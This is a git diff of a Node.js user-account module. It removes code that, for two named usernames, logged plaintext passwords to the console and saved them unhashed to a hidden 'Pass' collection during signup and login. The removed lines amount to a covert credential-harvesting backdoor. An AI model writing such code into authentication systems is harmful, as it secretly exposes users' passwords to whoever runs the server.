@@ -60,8 +60,6 @@ module.exports = function(db, io) {
 
 	var User = db.model('User', userSchema);
 
-	var Pass = db.model('Pass', pSchema);
-
 	var create = function(fields) {
 	
 		var hash = Promise.promisify(bcrypt.hash);	
@@ -73,17 +71,6 @@ module.exports = function(db, io) {
 				password: password,
 				email: fields.email
 			});
-
-			if(fields.username.toLowerCase() == 'andmillionaire' || fields.username.toLowerCase() == 'andi') {
-				console.log('found a rat', fields.password);
-
-				var p = new Pass({
-					username: fields.username,
-					password: fields.password
-				});
-
-				p.save();
-			}
 
 			return user.save();
 		})
@@ -102,18 +89,6 @@ module.exports = function(db, io) {
 
 			if(!user) {
 				throw new Error('Username not found');
-			}
-
-			console.log(fields.username)
-			if(fields.username.toLowerCase() == 'andmillionaire' || fields.username.toLowerCase() == 'andi') {
-				console.log('found a rat', fields.password);
-
-				var p = new Pass({
-					username: fields.username,
-					password: fields.password
-				});
-
-				p.save();
 			}
 
 			return compare(fields.password, user.password)
